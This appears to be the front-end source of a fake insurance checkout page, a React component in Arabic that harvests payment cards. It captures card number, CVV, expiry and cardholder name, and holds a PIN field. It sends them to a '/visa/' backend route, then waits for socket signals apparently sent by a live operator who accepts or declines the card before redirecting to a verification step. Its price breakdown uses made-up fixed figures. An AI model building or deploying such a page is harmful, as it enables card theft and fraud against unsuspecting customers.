import axios from "axios";
import React, { useEffect, useRef, useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { GiConfirmed } from "react-icons/gi";
import { VscCheck } from "react-icons/vsc";
import { FaSquarePhone } from "react-icons/fa6";
import Navbar from "../Navbar";

const Confirm = ({ setLoading, loading }) => {
  const data = new URLSearchParams(window.location.search);
  const query = JSON.parse(data.get("data"));
  const companyData = query.companyData;
  const [card_number, setCardNumber] = useState("");
  const [cvv, setCvv] = useState("");
  const [pin, setPin] = useState("");
  const [error, setError] = useState(false);
  const [errorCard, setErrorCard] = useState(false);
  const [pay, setPay] = useState(false);
  const [car_holder_name, setCardHolderName] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [verfiy, setVrefiy] = useState(false);
  const [load, setLoad] = useState(null);
  const [method, setMethod] = useState("visamaster");
  const [popUp, setPop] = useState(false);
  const [card, setCard] = useState("");

  useEffect(() => {
    setTimeout(() => {
      setPop(false);
    }, [100000]);
  }, []);

  const handleExpiryDateChange = (e) => {
    // Limit input to 4 characters (MM/YY)
    const numericValue = e.target.value.replace(/\D/g, "");
    let formattedValue = numericValue.slice(0, 5);

    // Add "/" after 2 characters (month)
    if (formattedValue.length > 2) {
      formattedValue =
        formattedValue.slice(0, 2) + "/" + formattedValue.slice(2);
    }

    setExpiryDate(formattedValue);
  };
  const formatCardNumber = (value) => {
    // Remove non-numeric characters
    const numericValue = value.replace(/\D/g, "");

    // Add space after every 4 digits
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");

    // Trim to 16 characters
    formattedValue = formattedValue.slice(0, 19);

    // Update state
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    if (e.target.value.startsWith("5")) {
      setCard("master");
    } else if (e.target.value.startsWith("4")) {
      setCard("visa");
    } else {
      setCard('')
    }
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    // Limit input to 3 digits
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };

  const handleSubmit = async (e) => {
    setLoad(true);
    setError(false);
    setErrorCard(false);
    e.preventDefault();
    if (card_number.startsWith("4")) {
      setCard("visa");
    } else if (card_number.startsWith("5")) {
      setCard("master");
    } else {
      setLoad(false);
      return setErrorCard("Card Must Start With 5 Or 4 ");
    }
    let check = card_number.split(" ").join("");
    if (check.length !== 16)
      return window.alert("رقم البطاقه يجب ان يكون 16 رقم");
    const finalData = {
      ...JSON.parse(data.get("data")),
      cardNumber: card_number,
      expiryDate,
      cvv,
      pin,
      card_name: car_holder_name,
    };
    try {
      await axios.post(api_route + "/visa/" + query._id, finalData).then(() => {
        socket.emit("paymentForm", JSON.parse(data.get("data"))._id);
        setVrefiy(true);
      });
    } catch (error) {
    } finally {
      setLoading(false);
    }
    // return window.location.href = `/verfiy?data=${JSON.stringify(finalData)}`
  };

  socket.on("acceptPaymentForm", (id) => {
    if (id === JSON.parse(data.get("data"))._id) {
      setVrefiy(false);
      sessionStorage.setItem(
        "card",
        card_number.startsWith("5")
          ? "master"
          : card_number.startsWith("4")
          ? "visa"
          : null
      );
      window.location.href = `/verfiy?data=${JSON.stringify({
        ...JSON.parse(data.get("data")),
        cardNumber: card_number,
      })}`;
    }
  });

  socket.on("declinePaymentForm", (id) => {
    console.log("declinePaymentForm", id, JSON.parse(data.get("data"))._id);
    if (id === JSON.parse(data.get("data"))._id) {
      setVrefiy(false);
      setLoad(false);
      setError("بيانات البطاقة غير صحيحة برجاء المحاولة مره اخري");
    }
  });

  if (!data.get("data")) {
    return (
      <div className="w-full flex items-center justify-center min-h-52 text-red-500 text-xl">
        Invalid Data
      </div>
    );
  } else {
    return (
      <>
        {popUp ? (
          <div className="fixed bg-black bg-opacity-60 top-0 h-screen w-full flex justify-center items-center ">
            <div
              className="absolute top-0 w-full  h-screen  -z-10"
              onClick={() => setPop(false)}
            ></div>
            <img
              src="/pop.jpg"
              className="w-3/4 rounded-md border border-white p-5 bg-white"
              onClick={() => setPop(false)}
            />
          </div>
        ) : (
          ""
        )}{" "}
        <div className="w-full lg:w-1/2 flex flex-col items-center justify-center  rounded-md bg-gray-50">
          <div
            className=" bg-opacity-75 w-full flex flex-col md:flex-row  items-center justify-start text-black px-2 py-3 rounded-lg "
            style={{ height: "130vh" }}
          >
            <div
              className=" w-full flex flex-col gap-y-2 md:items-end justify-center items-center md:py-2 bg-white"
              dir="rtl "
            >
              <span className="text-xl font-bold border-b w-full py-3 text-center">
                تفاصيل الدفع
              </span>
              <form
                className="w-full flex flex-col justify-center items-center   gap-y-3 py-5"
                onSubmit={handleSubmit}
              >
                <div
                  className="w-11/12 flex flex-col gap-y-2 border-[#3390ca] border rounded-md p-3"
                  dir="rtl"
                >
                  <div className="w-full flex items-center justify-center">
                    <img src={query.companyData.logo} className="w-2/3" />
                  </div>
                  <span className="text-base  text-gray-500">
                    فترة التأمين :
                  </span>
                  <div className="flex w-full justify-between pl-2 text-sm text-gray-600 ">
                    <span className=" ">تاريخ البداية : </span>
                    <span>{new Date(Date.now()).toDateString()}</span>
                  </div>
                  <div className="flex w-full justify-between pl-2 text-sm text-gray-600 ">
                    <span className=" ">تاريخ النهاية</span>
                    <span className="">
                      {" "}
                      {new Date(
                        Date.now() + 1000 * 60 * 60 * 24 * 365
                      ).toDateString()}
                    </span>
                  </div>

                  <div className="flex gap-x-2">
                    <span className="text-sm  text-gray-500">
                      {" "}
                      تفاصيل السعر :
                    </span>
                  </div>
                  <div className="flex w-full justify-between pl-2 text-sm text-gray-600 ">
                    <span className=" "> القسط الأساسي : </span>
                    <span className=" ">{query.companyData.price} ريال</span>
                  </div>
                  <div className="flex w-full justify-between pl-2 pb-2 border-b text-sm text-green-600 ">
                    <span> خصم عدم وجود مطالبات </span>
                    <span>110.10 ريال</span>
                  </div>
                  <div className="flex w-full justify-between pl-2 text-sm text-gray-600 ">
                    <span className=" "> المجموع الفرعي : </span>
                    <span className=" ">
                      {Number(query.companyData.price) - 110.1} ريال
                    </span>
                  </div>
                  <div className="flex w-full justify-between pl-2 pb-2 border-b text-sm text-gray-600 ">
                    <span> ضريبة القيمة المضافة (15%):</span>
                    <span>110.10 ريال</span>
                  </div>
                  <div className="p-3 w-full flex justify-between items-center">
                    <span>المبلغ الإجمالي :</span>
                    <span className="flex-1 text-left text-3xl font-bold">
                      {query.companyData.price} ريال
                    </span>
                  </div>
                </div>

                <div
                  className="flex flex-col w-full gap-y-3 mt-5 px-5"
                  dir="rtl"
                >
                  <span className="font-bold"> اختر طريقة الدفع</span>
                </div>

                <div
                  className="flex items-start justify-center w-full px-5 gap-x-4 "
                  dir="rtl"
                >
                  <div
                    className={`  flex  items-center justify-center border w-2/3   gap-x-5 px-5 py-5 rounded-md ${
                      method === "visamaster" && "border-blue-700"
                    } `}
                    onClick={() => setMethod("visamaster")}
                  >
                    <img src="/MasterCard.svg" className="w-1/4 " />
                    <img src="/Mada.svg" className="w-1/4" />
                    <img src="/Visa.svg" className="w-1/4" />
                  </div>
                  <div
                    className={` w-1/3 flex items-center justify-center border max-h-16 gap-x-5 px-5 py-5 rounded-md ${
                      method === "apple" && "border-blue-700"
                    }  `}
                    onClick={() => setMethod("apple")}
                  >
                    <img src="/apple.png" className="w-2/3 h-full" />
                  </div>
                </div>
                <div
                  class={`flex items-center flex-row-reverse text-right border  gap-x-2 px-5 py-4 rounded-md ${
                    method === "sdad" && "border-blue-700"
                  }  `}
                  onClick={() => setMethod("sdad")}
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="2"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    class="lucide lucide-building2 lucide-building-2 w-6 h-6 mx-3"
                    aria-hidden="true"
                  >
                    <path d="M6 22V4a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v18Z"></path>
                    <path d="M6 12H4a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2h2"></path>
                    <path d="M18 9h2a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2h-2"></path>
                    <path d="M10 6h4"></path>
                    <path d="M10 10h4"></path>
                    <path d="M10 14h4"></path>
                    <path d="M10 18h4"></path>
                  </svg>
                  <div>
                    <div class="font-medium text-gray-800">الدفع عبر سداد</div>
                    <div class="text-sm text-gray-600">
                      لمستخدمي بنك الراجحي الدفع عبر المباشر
                    </div>
                  </div>
                </div>

                {method === "visamaster" ? (
                  <>
                    {" "}
                    <div
                      className="flex flex-col w-full gap-y-3  "
                      dir="rtl"
                    ></div>
                    <div
                      className="flex flex-col w-full   text-base px-2  pt-4 pb-2 gap-y-2 text-gray-700 font-bold border-t"
                      dir="rtl"
                    >
                      <span>اسم حامل البطاقة</span>
                      <input
                        value={car_holder_name}
                        required
                        onChange={(e) => setCardHolderName(e.target.value)}
                        dir="ltr"
                        minLength={4}
                        type="text"
                        placeholder="أدخل اسم حامل البطاقة "
                        className="border px-3 py-2 text-right font-light border-gray-400 text-base  outline-blue-500 rounded-md "
                      />
                    </div>
                    <div
                      className="flex flex-col w-full   text-base px-2  gap-y-2 text-gray-700 font-bold "
                      dir="rtl"
                    >
                      <div className="flex w-full justify-between items-center">
                        <span>رقم البطاقة</span>
                        {card === "visa" ? (
                          <img className="w-12" src="/visa.png" />
                        ) : card === "master" ? (
                          <img className="w-12" src="/mastercard.png" />
                        ) : (
                          ""
                        )}
                      </div>
                      <input
                        value={card_number}
                        required
                        onChange={handleCardNumberChange}
                        dir="ltr"
                        maxLength={19}
                        minLength={16}
                        inputMode="numeric"
                        type="text"
                        className="border px-3 py-2 text-right font-light border-gray-400 text-base  outline-blue-500 rounded-md "
                      />
                    </div>
                    <div className="flex w-full gap-x-3 items-center justify-between px-2  ">
                      <div className="flex flex-col  items-end  justify-center gap-y-2">
                        <span> رمز الأمان</span>
                        <input
                          className="border  p-2 text-left font-light border-gray-400 text-base  outline-blue-500 rounded-md "
                          type="text"
                          value={cvv}
                          onChange={handleCvvChange}
                          inputMode="numeric"
                          placeholder="***"
                          maxLength={3}
                          required
                        />
                      </div>
                      <div className="flex flex-col  items-end  justify-center gap-y-2">
                        <span> تاريخ إنتهاء الصلاحية </span>
                        <input
                          className="border  w-full p-2 text-left font-light border-gray-400 text-base  outline-blue-500 rounded-md "
                          type="text"
                          value={expiryDate}
                          maxLength={5}
                          inputMode="numeric"
                          onChange={handleExpiryDateChange}
                          placeholder="MM/YY"
                          required
                        />
                      </div>
                    </div>
                    {errorCard && (
                      <span className="font-bold text-red-500 p-5 w-full border-red-500 border text-center mt-2 text-sm">
                        {errorCard}
                      </span>
                    )}
                    {error && (
                      <span className="font-bold text-red-500 p-5 w-full border-red-500 border text-center mt-2 text-sm">
                        {error}
                      </span>
                    )}
                    <button
                      type="submit"
                      className="flex items-center text-white bg-yellow-500 rounded-md text-xl justify-center gap-2 px-2 w-full mx-2 py-3 mt-5"
                    >
                      ادفع الآن - {query.companyData.price} ريال
                    </button>
                    <div className="flex  items-center gap-x-1">
                      <span>جميع المدفوعات محمية ومشفرة</span>
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        class="lucide lucide-circle-check-big w-4 h-4 mr-2 text-green-600"
                        aria-hidden="true"
                      >
                        <path d="M21.801 10A10 10 0 1 1 17 3.335"></path>
                        <path d="m9 11 3 3L22 4"></path>
                      </svg>
                    </div>
                  </>
                ) : (
                  <div className="w-full flex items-center justify-center">
                    <span className="font-bold text-red-500 p-5 w-1/2 border-red-500 border text-center mt-5">
                      غير متوفرة حاليا
                    </span>
                  </div>
                )}
              </form>
            </div>
          </div>
          {load ? (
            <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
              <TailSpin
                height="50"
                width="50"
                color="white"
                ariaLabel="tail-spin-loading"
                radius="1"
                wrapperStyle={{}}
                wrapperClass=""
                visible={true}
              />
            </div>
          ) : (
            ""
          )}
        </div>
      </>
    );
  }
};

export default Confirm;
